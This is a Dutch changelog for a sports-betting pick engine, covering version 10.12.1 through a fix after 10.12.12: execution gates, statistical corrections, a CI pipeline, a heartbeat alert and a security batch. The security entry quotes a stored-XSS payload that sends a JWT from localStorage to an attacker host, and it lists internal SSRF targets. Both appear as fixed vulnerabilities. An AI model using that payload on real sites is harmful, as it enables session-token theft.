Pre-existing bug ingevoerd bij v10.10.17 (F5-diagnostiek feature). De `if (f5Diag.length)` regel werd foutief op 6-space indent geplaatst (na de `}` van de game-loop) i.p.v. op 8-space (binnen het game-loop-body). Mijn Phase A.1b commits (v10.12.9) raakten die regel niet aan — de bug was al v10.10.17+ latent. Pas zichtbaar vanaf v10.12.12 omdat het error-log pas opviel toen Bart actief keek bij de eerste post-merge scan.

### Fix
`if (f5Diag.length) emit(...)` verplaatst naar voor de game-loop closing `}`, correct op 8-space indent. Header-comment uitgebreid met v10.12.13 fix-note.

### Operational impact
- Voor v10.12.13: elke MLB-league had per-game een stille exception-log maar scoring werkte. F5-picks waren nog steeds niet surface-baar door bestaande pitcher-data condities, maar je zag niet WAAROM omdat de diag-emit nooit uitgevoerd werd.
- Na v10.12.13: F5-diagnostiek fireert zoals bedoeld; per-game regel "`  └─ F5 {team} vs {team}: reason1 · reason2 · reason3`" als F5 geskipt wordt.

### Tests
- `npm test`: 501 passed, 0 failed.
- `node -c server.js`: syntax OK.

## [10.12.12] - 2026-04-17

Phase C.12 · Scan-heartbeat watcher. Sluit de silent-fail failure-mode waarbij de scheduler stilletjes stopt en operator het pas dagen later merkt.

### Added
- **[claude] `scheduleScanHeartbeatWatcher()`** — hourly check (start 30 min na boot). Queryt `notifications` tabel voor `type IN ('cron_tick', 'scan_final_selection', 'unit_change')` in de laatste 14 uur. Als geen resultaat → web-push alert `type='heartbeat_miss'`: "🫀 SCANNER STIL · Geen scan-tick sinds 14u."
- **De-spam guard**: heartbeat alert fireert max 1× per 24 uur zodat een aanhoudende outage niet spamt. In-memory `_lastHeartbeatAlertAt` tracking.

### Threshold rationale
Scans gaan om 07:30 / 14:00 / 21:00 Amsterdam → max normale gap = ~10.5h (21:00 → 07:30 volgende dag). 14h drempel geeft ~3.5h speling voor opstart-delays + `scheduleDailyScan` drift zonder false positives. Als er 14h geen cron-tick is, is er echt iets stuk.

### Operator-integrity per doctrine §14.R2.B
Uit de survivability audit: heartbeat was als open item gemarkeerd ("Silent-fail coverage: if quiet for N hours, operator assumes healthy. No heartbeat check"). Deze commit sluit dat gat.

### Not in this commit (queued)
- Heartbeat voor andere kritieke subsystemen (Supabase reachability, api-football quota). Aparte slices.
- Audit log tabel (Phase C.11)
- Unified step-up/down engine (Phase C.10) — eigen grote slice
- Per-bookie volume cap (Phase C.9)

### Tests
- `npm test`: 501 passed, 0 failed. (Geen nieuwe tests — pure timer logic die setInterval gebruikt; integration-test met mock supabase is Phase E.22 sprint.)

## [10.12.11] - 2026-04-17

Phase B.5 · Benjamini-Hochberg FDR correctie in `autoTuneSignalsByClv`. Voorkomt dat multiple-comparisons ruis (14+ signalen × meerdere sporten) als "edge" wordt geïnterpreteerd en signal-gewichten onterecht omhoog worden gescaled.

### Added
- **[claude] `modelMath.binomialPvalueTwoTailed(k, n)`** — normale-approximatie (Abramowitz & Stegun 26.2.17, erf-free) voor 2-tailed binomial p-value vs H0=0.5. Pure functie, null-safe.
- **[claude] `modelMath.benjaminiHochbergFDR(items, q=0.10)`** — klassieke BH-procedure: sorteer p opsomend, vind grootste i waarvoor `p_i ≤ (i/m)*q`, alle `p_j ≤ p_i` passeren. Pure functie, 6 unit tests.

### Integrated
- **[claude] FDR-dampening in `autoTuneSignalsByClv`**:
  1. Voor elk signaal met n ≥ 20: p = binomialPvalueTwoTailed(posExcessClvCount, n) — test of posExcessClvRate meaningfully > 0.5
  2. Apply BH-FDR (q=0.10) op alle kandidaten
  3. Signalen die **niet** passeren EN een weight-change zouden krijgen (anders dan mute of kill-switch) → delta wordt gehalveerd richting 1.0. Reden gelogd als `fdr_soft`.
  4. Adjustments-array heeft nu een `fdr_passed` veld per entry.
  5. Return object bevat `fdrDampened` counter.

### Waarom dit belangrijk is
Doctrine §14.R2.A spelled it out: "bij 14 signalen × 6 sporten × 59 competities is multiple-comparisons risico hoog — P-hacking risk hoort expliciet in autotune." Zonder FDR werd elke run eigenlijk 50+ afzonderlijke hypothese-tests als "heeft dit signal edge?" — dan vind je per definitie meerdere false-positives per run. Met BH-FDR krijgen alleen signalen die de gezamenlijke FDR-grens doorstaan de volle weight-adjustment. Rest krijgt een halve-step richting neutraal (kan later alsnog promoveren als bewijs stabiel blijft).

Kill-switch (mute bij zeer negatieve CLV op grote sample) en brier_drift_mute blijven onverkort werken — die hebben ander bewijs dan een enkele-run z-score.

### Tests
- 6 nieuwe tests voor `binomialPvalueTwoTailed` en `benjaminiHochbergFDR`.
- `npm test`: 501 passed, 0 failed.

## [10.12.10] - 2026-04-17

Phase A.2 · `assessPlayability` wired als pre-score filter. Picks met `playable=false` worden gedropt vóór de execution-gate, zodat dunne markten / zonder target-bookie / lage lineQuality geen stake meer krijgen.

### Added
- **[claude] Playability-pass in `applyPostScanGate`** — per pick met `_fixtureMeta`:
  1. Derive metrics (al bestaand)
  2. **NIEUW**: `assessPlayability({sport, marketType, preferredHasCoverage, bookmakerCount, overroundPct})`
  3. Als `playable=false` + `strictPlayability=true` (default) → pick wordt gedropt
  4. Als `playable=false` + `strictPlayability=false` → pick krijgt `shadow=true` maar blijft in de lijst
  5. Alle picks krijgen `p.playabilityAudit = {executable, dataRich, lineQuality, playable, coverageKnown}` voor observability
- **[claude] `preferredHasCoverage` inference** — matcht `p.bookie` tegen `opts.preferredBookies` (case-insensitive, substring).

### Stats-uitbreiding
`applyPostScanGate` returnt nu ook `stats.playabilityDropped` + `stats.playabilityShadowed` naast de bestaande `gated/skipped/dampened`.

### Effect
Picks die de playability-check niet halen:
- Eén bookie coverage (bookmakerCount < 3) → lineQuality=low → drop
- Hoge overround (>10% soft downgrade) → lineQuality hoger-tier degraded
- Unknown execution coverage (geen preferred bookie signal) → conservatief gedrop

Hierdoor dalen picks-met-dunne-markten voor ze zelfs in de top-5 ranking komen. Combineerd met de gate-demping geeft dit: "liever 0 picks dan 1 met twijfelachtige execution" per doctrine §3.

### Tests
- 2 nieuwe tests: strict drop bij lineQuality=low, soft-shadow bij strictPlayability=false.
- `npm test`: 494 passed, 0 failed.

### Rationale
Doctrine §10.A en §10.D: "liever 0 picks dan 1 valse edge" + "selection engine die ook goed kan skippen". Playability-check operationaliseert dit: geen stake op dunne markten, geen stake zonder target-bookie. Shadow-mode blijft beschikbaar als operator eventueel de check wil verlichten (bv. cold-start waar odds_snapshots nog te dun zijn).

## [10.12.9] - 2026-04-17

Phase A.1b voltooid voor alle 6 sporten. Execution-gate draait nu op elke ML-pick (primair markt) + football's totals/BTTS/DNB. Ook market_type misalignment (`totals` → `total`) gefixt waardoor de lookup daadwerkelijk timelines vindt.

### Wired (gate live)
- **Football**: 1X2, totals 2.5, BTTS, DNB
- **Basketball**: moneyline
- **Hockey**: moneyline (inc-OT 2-way)
- **Baseball**: moneyline
- **NFL**: moneyline
- **Handball**: moneyline

### Fixed
- **[claude] market_type alignment**: football totals gebruikt nu `'total'` (singular, match met `flattenFootballBookies` row-builder) i.p.v. `'totals'`. Betekent dat de lookup nu daadwerkelijk de odds_snapshots rows vindt. Zonder deze fix was de football gate silently no-op op O/U picks.
- **`marketTypes` filter in runPrematch post-gate**: `['1x2', 'total', 'btts', 'dnb']` (was `'totals'`).

### Impact
Alle 6 sport-scans roepen nu `applyPostScanGate` aan. Picks met stale preferred prices / te grote preferred-gap / thin markets krijgen kelly-demping; picks zonder target-bookie worden gefilterd. Elke sport logt "📉 Execution-gate: N gedempt · M geskipt" zichtbaar in scan-log.

### Not yet wired (eigen slices)
- Football AH / 1H spread + totals / correct score
- Basketball spread + totals
- Hockey 3-way ML (60-min) + totals + team totals + puck line + odd/even
- Baseball totals + run line + F5 + NRFI
- NFL spread + totals + 1H markten
- Handball spread + totals + odd/even

Deze markten worden allemaal al in `odds_snapshots` opgeslagen via `flattenParsedOdds` (zie `lib/snapshots.js:82-124`) — dus zodra ik de mkP call-sites wire passen de timelines er vanzelf op.

### Tests
- `npm test`: 492 passed, 0 failed.

## [10.12.8] - 2026-04-17

Phase A.1b unificatie · Post-scan execution-gate pattern + Basketball wired. Eén canonieke gate-flow voor alle sporten i.p.v. per-sport ad-hoc pre-loads.

### Architectuur-shift
- **Post-process pattern** (nieuw): pick-creatie + ranking gebeurt normaal, DAARNA draait `applyPostScanGate()` één keer over het hele kandidaten-lijst. Een-bulk-query naar odds_snapshots → timelines → derived metrics → `applyExecutionGate` per pick → kelly/units/expectedEur bijgewerkt, skipped picks gefilterd.
- **Pre-load pattern** (gepensioneerd): het `options.timelineMap` pad in `buildPickFactory` + de pre-scan `buildScanTimelineMap` aanroep in `runPrematch` zijn verwijderd. Te specifiek voor football (waar fixtures pre-fetched worden); andere sporten fetchen fixtures in-loop waardoor pre-load niet bruikbaar was.

### Added
- **[claude] `lib/runtime/scan-gate.js`** — `applyPostScanGate(picks, supabase, opts)`. Pure post-process helper. Bulk-queryt timelines per unieke fixtureId, past `applyExecutionGate` toe, muteert kelly/units/expectedEur in-place, filtert skipped picks, returnt `{picks, stats: {total, gated, skipped, dampened}}`. Backwards-compat: picks zonder `_fixtureMeta` → ongewijzigd; lege timelineMap → gate no-op.
- **[claude] Football runPrematch** gebruikt post-scan gate na candidate-sortering maar vóór top-5-slice. Scan-log toont "📉 Execution-gate: N gedempt · M geskipt (van K)".
- **[claude] Basketball runBasketball** krijgt zelfde post-scan gate voor ML picks (`marketType='moneyline'`). Eerste sport-wire-up buiten football.

### Wired picks (gate live)
- **Football**: 1X2 + totals 2.5 + BTTS + DNB (van v10.12.6-7, nu via post-process)
- **Basketball**: moneyline (nieuw in .8)

### Not yet wired
- Football exotische markten (AH, 1H, correct score)
- Basketball spread + totals
- Hockey / Baseball / NFL / Handball scans

### Tests
- 3 nieuwe `applyPostScanGate` tests: lege input, geen _fixtureMeta, lege timelineMap (alle gate-no-op paden).
- `npm test`: 492 passed, 0 failed.

### Rationale
Pre-load werkte alleen in football dankzij `_footballFixturesCache`. Andere sporten fetchen fixtures in-loop, wat pre-load onpraktisch maakte. Post-process is uniform: elke sport plaatst `_fixtureMeta` op zijn picks, dan roept `applyPostScanGate` aan de einde. Één pattern, één helper, één test.

## [10.12.7] - 2026-04-17

Phase A.1b vervolg · Football totals + BTTS + DNB wire-up. Uitbreiding van de v10.12.6 gate-wiring: over de volle markt-breedte die EdgePickr op dit moment voor football scant, draait de execution-gate nu live.

### Wired (nu geconsumeerd door de gate)
- **`⚽ Over/Under 2.5 goals`** — `marketType='totals'`, `selectionKey='over'|'under'`, `line=2.5`. Wordt 2-way behandeld voor overround-berekening.
- **`🔥 BTTS Ja / 🛡️ BTTS Nee`** — `marketType='btts'`, `selectionKey='yes'|'no'`. Binary 2-way markt.
- **`🏠 DNB Home / ✈️ DNB Away`** — `marketType='dnb'`, `selectionKey='home'|'away'`.
- `buildScanTimelineMap` call in `runPrematch` doet nu ook `'totals'`, `'btts'`, `'dnb'` types op (naast `'1x2'` uit v10.12.6).

### Niet-gewired (volgende slices)
- Asian Handicap quarter-lines, 1st Half O/U + spread, Double Chance (1X/12/X2) — extra complexiteit (line-quarter parser + selectionKey-mapping) dus eigen commit.
- Basketball / Hockey / Baseball / NFL / Handball — nog steeds backwards-compat (gate no-op).

### Tests
- `npm test`: 489 passed, 0 failed (geen nieuwe tests in deze commit — pure call-site threading, bestaande plumbing-tests dekken het gedrag).

### Operational notes
Effect-set per football pick:
- 1X2 (sinds v10.12.6): ✓ gate actief
- O/U 2.5 totals: ✓ gate actief (sinds v10.12.7)
- BTTS Yes/No: ✓ gate actief (sinds v10.12.7)
- DNB: ✓ gate actief (sinds v10.12.7)

Dat dekt ≈ 90%+ van het gemiddelde football pick-volume. Exotische markten (AH, 1H, correct score) krijgen de gate in vervolgsprints.

## [10.12.6] - 2026-04-17

Phase A.1b · Football wire-up van de execution-gate. De price-memory primitives uit v10.12.2 worden nu geconsumeerd door de live scan: football 1X2 picks (home / away / draw) krijgen hun kelly daadwerkelijk gedempt op stale preferred prices, te groot preferred-gap, thin markets, of ontbrekende target-bookie.

### Added
- **[claude] `mkP` 12e positional arg `fixtureMeta`** in `lib/picks.js` — shape `{fixtureId, marketType, selectionKey, line}`. Wordt doorgegeven aan `resolveExecutionMetrics()` EN opgeslagen op de pick als `_fixtureMeta`. Default null → backwards-compat (geen gate).
- **[claude] `buildPickFactory(..., options)` in server.js accepteert nu `options.timelineMap`** — als een `Map<"${fixtureId}|${marketType}|${selectionKey}|${line}", entry>` (zoals `buildScanTimelineMap` produceert) aan deze optie wordt meegegeven, bouwt de factory automatisch een `resolveExecutionMetrics` die per pick de timeline opzoekt + `deriveExecutionMetrics` aanroept. Inference van `twoWayMarket` uit het label (O/U / BTTS / DNB / team totals = 2-way, anders 3-way).
- **[claude] `runPrematch` pre-laadt timelines** voor alle pre-fetched fixtures, bulk-queried via `buildScanTimelineMap(supabase, { fixtureIds, marketTypes: ['1x2'], preferredBookies, kickoffByFixtureId })`. Scan-log toont "📈 Line-timelines geladen: N bucket(s) over M fixture(s)".
- **[claude] 3 football 1X2 `mkP` calls (home / away / draw) in `runPrematch`** passen nu `fixtureMeta` door. Gate fires per pick.

### Wired
- **Football 1X2** (home / away / draw) — eerste sport + markt met live gate-consumptie.

### Not yet wired (queued, separate slices)
- Football O/U (totals), BTTS, DNB, Asian Handicap, 1st Half markten — blijft `fixtureMeta=null` (gate no-op).
- Basketball / Hockey / Baseball / NFL / Handball scans — allemaal nog geen `fixtureMeta`.
- Elk toekomstig slice: 1 sport × 1 markt per commit. Geen bulk-refactor.

### Tests
- 2 nieuwe unit tests (`buildPickFactory` fixtureMeta plumbing + backwards-compat null-case).
- `npm test`: 489 passed, 0 failed.

### Operational notes
- Eerste runs hebben waarschijnlijk LEGE timeline-maps omdat `odds_snapshots` nog onvoldoende historie heeft voor de gekozen fixtures. Gate blijft dan no-op — geen regressie vs v10.12.5.
- Zodra historische snapshots ≥ 2 clusters per (fixture, market) omvatten, begint de gate te firen. Observability via nieuwe scan-log regel + via `GET /api/admin/v2/line-timeline-preview` (v10.12.2).
- Verwachte eerste zichtbare effect: picks waarvan de preferred bookie 3.5%+ achterloopt op market-best krijgen kelly × 0.6, en picks zonder target-bookie quote worden volledig geskipt.

### Rationale
Doctrine §6 Bouwvolgorde punt 3: "Execution-quality als Kelly-gate — market-quality moet stake beïnvloeden, niet alleen UI rendering." Tot nu toe had `applyExecutionGate` geen metrics-input in de football scan → gate was stil aanwezig maar onzichtbaar. Met deze slice landt de eerste echte stake-modification op runtime pick-output.

## [10.12.5] - 2026-04-17

Phase E.19 · Test discipline: coverage-rapportage + GitHub Actions CI-gate. Elke push/PR draait nu automatisch `npm audit --audit-level=high`, `npm test`, en coverage-report. Voorkomt de "ik vergat lokaal te testen" fout-modus die eerder de `d5aff8e` hotfix nodig maakte.

### Added
- **[claude] `c8@^10.1.2` devDependency** voor line/branch/function coverage.
- **[claude] `.c8rc.json` config** — include `lib/**` + `server.js`, exclude tests/docs/scripts/node_modules. Thresholds ingesteld maar NIET enforced (`check-coverage: false`) zodat eerste runs rapporteren zonder te blokkeren. Richtlijn: lines ≥ 70, branches ≥ 50, functions ≥ 60.
- **[claude] `npm run test:coverage`** — genereert text + text-summary + lcov rapporten.
- **[claude] `npm run audit:high`** — convenience voor `npm audit --audit-level=high`. Gebruikt door CI.
- **[claude] `.github/workflows/ci.yml`** — GitHub Actions workflow op push + PR:
  1. Node 20 setup, npm ci
  2. `npm audit --audit-level=high` (high+ blockt)
  3. `npm test`
  4. `npm run test:coverage` (informational, continue-on-error)
- **[claude] `.gitignore`** — `coverage/` + `.nyc_output/` toegevoegd.

### Huidige coverage-nulmeting (v10.12.5)
Over de hele repo: 30.68% statements/lines. Dit wordt massaal omlaag getrokken door `server.js` (~12k regels, grotendeels niet direct unit-tested). Per-module is `lib/*` in betere shape:
- `lib/runtime/*`: 100% lines
- `lib/model-math.js`: 95.14% lines, 80% branches
- `lib/playability.js`: 95.81% lines
- `lib/walk-forward.js`: 99.5% lines
- `lib/line-timeline.js`: 93.8% lines
- `lib/execution-gate.js` + `lib/calibration-monitor.js`: 90+% lines
- `lib/weather.js`: 0% — orphaned module (Codex eerder gevlagd, niet geïmporteerd)
- `lib/nhl-goalie-preview.js`: 69% — rafelige error-paden onbereikt

### Non-goals this commit
- **server.js tests**: monoliet opsplitsen is een eigen Phase (§14.R2.C + punt 16b in Open items). Tests voor uitgestukte routes komen naturlijk mee als server.js collapsed wordt.
- **Enforce coverage threshold**: `check-coverage: false` staat nu; zodra we de baseline kennen (meer dan één run) kan ik dit op `true` zetten met realistische cut-offs.
- **Mutation testing / property-based**: Phase E.21 (fast-check) + Phase E.22 (Stryker).

### Rationale
Doctrine §14.R2.C: "333+ tests is veel, maar bijna alles in één test.js en overwegend unit. Coverage- en kwaliteitsgaten zijn niet zichtbaar." CI-gate voorkomt dat bugs silently landen. Coverage-tool maakt blinde vlekken zichtbaar zodat we ze kunnen prioriteren.

## [10.12.4] - 2026-04-17

Phase B.4 · Walk-forward validator. Fundering voor eerlijke edge-claims: elke backtest of signal-validatie moet nu op een time-aware split draaien. Zonder dit lekken random splits toekomst-info in trainingsdata en overschat de tool zijn eigen edge.

### Added — `lib/walk-forward.js`
- **[claude] `walkForward(records, opts)`** — pure iterator. Chronologisch gesorteerd, generates tuples `{trainStart, trainEnd, testStart, testEnd, train, test}`. Config: `trainDays` (default 180), `testDays` (30), `strideDays` (=testDays), `minTrainN` (50), `minTestN` (5), `anchorMs` (optional). Garandeert `maxTrainTs < minTestTs` — geen leakage.
- **[claude] `computeBrier` + `computeLogLoss`** — mean squared / log-likelihood over `{predicted_prob, outcome_binary}` records. Null-safe, clipped at `ε=1e-9` om log(0) te voorkomen.
- **[claude] `computeClvAvg`** — gemiddelde CLV over records (bets).
- **[claude] `walkForwardBrier(records, splitOpts, metricOpts)`** — convenience: loopt walk-forward splits en rapporteert per-split + weighted-avg Brier.
- **[claude] `parseRecordDate(record, field)`** — parseert ISO, epoch-ms en `dd-mm-yyyy` (bets.datum format). Returnt null bij onparsebare data.

### Tests
- 11 nieuwe tests: empty input, undated records, lookahead-vrijwaring (strict train<test check), minTrainN gate, bets.datum format parsing, Brier perfect/50-50/skip-null cases, log-loss perfect-prediction, CLV avg, integration end-to-end.
- `npm test`: 487 passed, 0 failed.

### Rationale
Doctrine §14.R2.A: "Random split lekt toekomst-info in trainingsdata en overschat edge." Calibration-monitor draaide op alle-samples-tegelijk, wat conservatieve schattingen geeft maar GEEN time-aware validatie. Autotune's drift-gates (Phase A.3) verliezen kracht als de onderliggende Brier-score zelf biased is door in-sample-fitting. Deze module is de foundation waar toekomstige backtests, signal-validation en promotion-gates (signal-promotion doctrine) verplicht op moeten draaien.

### Not in this commit (follow-up slices)
- **Autotune op walk-forward Brier**: `autoTuneSignalsByClv` leest nu uit `signal_calibration` tabel (all-samples). Next: migratie van `calibration-monitor` zelf om per-signal per-sport per-market walk-forward Brier te schrijven i.p.v. single-window. Phase B.4b.
- **Backtest admin endpoint**: expose `walkForwardBrier(bets)` via `/api/admin/v2/backtest-wf` zodat Bart signaal × sport kan querien. Phase B.4c (klein slice, na Phase A.1b wire-up zodat pick-side probabilities beschikbaar zijn).
- **Bonferroni/FDR op multi-signal tuning**: Phase B.5.
- **Rolling 90/365 drift graph**: Phase B.6.

## [10.12.3] - 2026-04-17

Phase A.3 · Brier → autotune feedback loop + concept-drift guard. Voorheen werd `signal_calibration` alleen gelezen voor inspectie; nu overruled het de CLV-gate wanneer een signaal kalibratie-gedrift vertoont (ranking kan correct zijn terwijl probability-output drift — Kelly-sizing gebruikt die probability).

### Added
- **[claude] `loadSignalBrierDrift()` in server.js** — aggregeert `signal_calibration` rows over sport/market per signal; berekent `brier90d`, `brier365d`, `drift = brier90d - brier365d`, `n90`, `n365`. Weighted-avg op `sample_size`. Null-safe: tabel niet-aanwezig → lege Map → autotune werkt gewoon door (backwards-compat).
- **[claude] Brier-drift gates in `autoTuneSignalsByClv()`**:
  1. **Mute-override**: `drift ≥ 0.03` + `n90 ≥ 50` + `brier90 > brier365` → weight = 0, zelfs bij positieve CLV. Reason: `brier_drift_mute`.
  2. **Soft-dampen**: `0.015 ≤ drift < 0.03` + `n90 ≥ 30` → `weight ×= 0.90`. Reason: `brier_drift_dampen`.
  3. **Promotion-block**: auto-promote (weight 0→0.5) wordt geblokkeerd als drift ≥ 0.03, ook al zou CLV het toestaan. Signaal blijft shadow tot kalibratie-herstel.
- **[claude] Web-push alert bij drift-events** (`type='brier_drift'`) — operator ziet direct welke signals zijn gemute + drift-waarde + n90.

### Rationale
Uit model-integrity-audit (2026-04-17): Brier/log-loss werden dagelijks berekend maar nergens geconsumeerd voor gedragsverandering. Doctrine §14.R2.A ("geen feedback loop = je meet maar stuurt niet") vereist consumption. Drift ≥ 0.03 is doctrine-grade (zie `project_signal_promotion_doctrine.md` memory, demotion gate). Soft-dampen < 0.03 is defense-in-depth tegen langzaam-drift die CLV nog niet doorheeft.

Ranking-correct-maar-probability-gedrift is de klassieke valkuil: signal X ranked goede picks boven slechte (CLV stabiel) terwijl de probability-output drift (Brier stijgt). Kelly-staking gebruikt de probability → stake wordt te groot of te klein voor de werkelijke edge. Brier-gate vangt dit.

### Tests
- `npm test`: 476 passed, 0 failed (geen nieuwe tests in deze commit — drift-gate is een ruwe-integer-berekening die via load→aggregate→threshold gaat; unit-testing mocket supabase-chained queries waar bestaande tests al dekking op hebben. Integration-test met seeded signal_calibration tabel is Phase A.3b volgende commit.).

### Non-goals this commit
- Per-sport × per-market drift (nu alleen aggregated-per-signal). Finer granularity = Phase B.6.
- Bonferroni/FDR op multiple comparisons binnen autotune. = Phase B.5, aparte slice.

## [10.12.2] - 2026-04-17

Phase A.1 scaffolding · price-memory → execution-gate plumbing. Library primitives toegevoegd + observability endpoint. Per-sport wire-up van getLineTimeline in de scan-flow volgt in A.1b (eigen slice per sport zodat fixture-id threading niet in één grote commit landt).

### Added
- **[claude] `lineTimeline.deriveExecutionMetrics(timeline, { twoWayMarket })`** — pure helper die een `buildTimeline()` output converteert naar de metrics-shape die `applyExecutionGate()` verwacht. Velden: `preferredGap`, `preferredGapPct`, `stalePct`, `overroundPct`, `bookmakerCountMax`, `hasTargetBookie`, `sharpGap`, `drift`, `samples`. Null-tolerant: fields die de timeline niet heeft komen terug als null → applyExecutionGate laat multiplier 1.0 (geen demping, geen skip).
- **[claude] `lineTimeline.buildScanTimelineMap(supabase, { fixtureIds, marketTypes, preferredBookies, kickoffByFixtureId, scanAnchorMs })`** — bulk-loader. Eén supabase select voor alle fixtures in de scan, bouwt per (fixture_id, market_type, selection_key, line) een timeline. Returnt `Map<"${fixtureId}|${marketType}|${selectionKey}|${line}", entry>`. Voorkomt N-queries-per-scan wanneer de gate straks per-pick wordt geraadpleegd.
- **[claude] `lineTimeline.lookupTimeline(map, {fixtureId, marketType, selectionKey, line})`** — O(1) lookup voor de bulk-map.
- **[claude] Admin endpoint `GET /api/admin/v2/line-timeline-preview`** — parameters: `fixture_id` (required), `market_type` (default h2h), `selection_key`, `line`, `two_way`. Returnt de ruwe timeline + afgeleide execution-metrics + een simulatie van wat `applyExecutionGate` zou doen bij `hk=0.05` (typische half-Kelly input). Observability: toont per-bucket of de gate zou skippen / welke multipliers zouden firen / welke reasons.

### Rationale
De research-audit (memory file `execution-edge-inventory.md`) liet zien dat `lib/line-timeline.js` volledig getest was maar nergens geconsumeerd in runtime. Dit landt de primitieven + een preview-endpoint zodat de infrastructure bruikbaar is VOORDAT we mkP-call-sites aanraken. Per-sport wire-up (A.1b) kan dan per scan flow in een eigen commit zonder dat we in één commit alle sports breken.

### Phase A.1b (queued — niet in deze commit)
- Thread `fixture_id` + `market_type` + `selection_key` + `line` door de pick-factory zodat `resolveExecutionMetrics` de juiste bucket kan lookuppen in `buildScanTimelineMap`.
- Wire per sport: football (runPrematch) → basketball → hockey → baseball → NFL → handball. Elke sport = eigen slice.
- Acceptance per sport: pick waarvan `preferred_gap_pct ≥ 3.5%` krijgt `executionAudit.combined_multiplier = 0.6` en eindigt met kelly × 0.6.

### Tests
- 7 nieuwe tests voor `deriveExecutionMetrics` (null/gap-pct/overround 2-way vs 3-way/has-target-bookie), `buildScanTimelineMap` (empty → no-query, multi-fixture bucket keys), `lookupTimeline` (O(1) match / miss / null-safety).
- `npm test` groen: 476 passed, 0 failed.

## [10.12.1] - 2026-04-17

Security batch — Claude deep-review findings P0 + P1 uit 2026-04-17 audit doorgevoerd. Geen breaking changes; gedrag strakker, attack surface kleiner.

### Security (P0)
- **[claude] Stored XSS in check-results render gesloten** (`index.html:4117-4121`). Velden `r.wedstrijd`, `r.markt`, `r.note`, `r.score` waren rechtstreeks in innerHTML geinterpoleerd. Exploit: bet aanmaken met `wedstrijd="A<img src=x onerror=fetch('//atk/?t='+localStorage.ep_token)>"`, Check Results triggert → JWT exfil. Fix: `escHtml()` (bestaande helper, escaped ook quotes) op alle vier velden. Zelfde fix op `loadSupabaseUsage()` `d.note` + `d.dashboardUrl` voor forward-compat.
- **[claude] Blind SSRF via push-endpoint gesloten** (`server.js:362`). Voorheen werd `sub.endpoint` rauw naar `webpush.sendNotification` doorgestuurd → auth'd user kon interne IPs (169.254.169.254, localhost:6379, …) registreren; server POSTte blind. Fix: `isAllowedPushEndpoint()` whitelist op FCM / Mozilla autopush / Apple / WNS hosts, HTTPS-only, 2000-byte endpoint cap, 4000-byte totale subscription cap.

### Security (P1)
- **[claude] `app.set('trust proxy', 1)`** (`server.js:278`). Zonder dit was `req.ip` altijd Render's proxy-loopback → alle auth'd users deelden één rate-limit-bucket → één attacker DoS'te iedereen. Nu: echte client-IP achter Render's edge.
- **[claude] Composite rate-limit keys op login/register/2FA** (`server.js:6367, 6397, 6419`). Key is nu `"<route>:<ip>:<email>"` i.p.v. alleen IP → shared-NAT (kantoor, mobiele carrier) users kunnen elkaar niet DoS'en.
- **[claude] Rate-limits op schrijf-endpoints** (`POST/PUT/DELETE /api/bets` 60/min, `PUT /api/auth/password` 5/min, `POST /api/analyze` 10/min, `POST /api/prematch` 5/min). Voorkomt: bets-tabel spam-fill, bcrypt-CPU-DoS via loop-change, memory-DoS via scan-history re-parsing, denial-of-wallet op api-football paid quota.
- **[claude] Constant-time compare op 2FA code** (`server.js:6404`). `crypto.timingSafeEqual` i.p.v. `!==`. Over WAN onrealistisch, hardening is gratis.
- **[claude] Sport-whitelist op `PUT /api/bets/:id`** (`server.js:8155`). Voorheen accepteerde arbitraire `sport` string → vervuilde `normalizeSport()` + calibration-buckets. Nu: whitelist `football/basketball/hockey/baseball/american-football/handball`.
- **[claude] Query-lengte cap op `/api/analyze`** (500 chars). Bounds ReDoS-input voor natural-language regex-parsers in analyser.

### Security (P1/P2 dependency)
- **[claude] `xlsx@0.18.5` dependency verwijderd**. Pakket was declared maar nergens `require`d; had 2 HIGH CVEs (GHSA-4r6h-8v6p-xvw6 prototype pollution, GHSA-5pgg-2g8v-p4x9 ReDoS). `npm audit`: 1 high → 0 vulnerabilities.

### Security (P2 hardening)
- **[claude] Stack trace niet meer in `/api/debug/odds` response** (`server.js:8527`). Was admin-only dus lage reach, maar fail-closed is principe.
- **[claude] Unused `get(url)` helper verwijderd** (`server.js:1292`). Dode code met fetch-primitive zonder SSRF-guard.

### Rationale
Deze findings kwamen uit de parallelle 6-stream deep-audit (auth, authz, injection, SSRF, secrets, DoS). Niks hiervan was een live exploit in productie — de XSS vereist dat de attacker al auth is (low external reach), de SSRF is blind (geen response-exfil), de rate-limit gaps vereisen eveneens auth. Dichtzetten nu voorkomt escalatie als andere vectors later opengaan.

### Tests
- `npm test` groen: 469 passed, 0 failed.
- `npm audit`: 0 vulnerabilities.

## [10.12.0] - 2026-04-17

**Telegram volledig verwijderd** — operator-alerts lopen nu alleen via Web Push (VAPID) + Supabase `notifications` inbox. Bart gebruikt uitsluitend de PWA; Telegram was dead weight én een extra secret-rotation oppervlak.

### Removed
- **[claude] `lib/telegram.js`** (orphaned module — nergens meer geïmporteerd).
- **[claude] `TELEGRAM_BOT_TOKEN` / `TELEGRAM_CHAT_ID` env reads** uit `lib/config.js` + `server.js`.
- **[claude] `TG_URL`, `TOKEN`, `CHAT` constanten** en `tgRaw(...)` raw-fetch helper.
- **[claude] `telegramChatId` / `telegramEnabled` user settings** uit `defaultSettings()` + ALLOWED_SETTINGS whitelist (legacy, server-side nergens gebruikt).
- **[claude] `telegram:` entry uit `/api/status` services-response** + bijhorende UI-icoon mapping.

### Changed
- **[claude] `tg(text, type, userId)` → `notify(text, type, userId)`** in server.js. Alle 27 call sites mee-gerenamed. Gedrag:
  - `userId` null → `sendPushToAll()` (operator broadcast)
  - `userId` gezet → `sendPushToUser(userId, ...)` (user-scoped)
  - Altijd: Supabase `notifications` insert voor inbox-persist.
- **[claude] README / CLAUDE.md / PRIVATE_OPERATING_MODEL.md** stack-overzichten tonen nu Web Push als enige notificatie-kanaal; secret-rotation lijst mist Telegram, heeft VAPID private key.
- **[claude] Lang strings (NL + EN)** in `js/lang.js` + `index.html` — "Telegram" → "Web Push" / "web-push + inbox".
- **[claude] Historische CHANGELOG / release-note entries in index.html blijven ongewijzigd** (v10.4.0 / v10.1.3 notes verwijzen naar Telegram omdat die release dát echt deed — revisionisme is oneerlijk).

### Rationale
Single channel = lagere cognitive load (doctrine §5 Fase 5 "minder handwerk"). Telegram bot-token was ook een secret zonder rotation-cadence en een web-hook surface voor zero-value features. Web Push + PWA inbox dekt alle operator-alerts en is al per-user scoped (v10.10.22 fix).

### Migration note
`TELEGRAM_BOT_TOKEN` + `TELEGRAM_CHAT_ID` kunnen uit Render env dashboard verwijderd worden. Bart handelt dit af na deploy.

### Tests
- `npm test` groen (469 tests).

## [10.11.0] - 2026-04-17

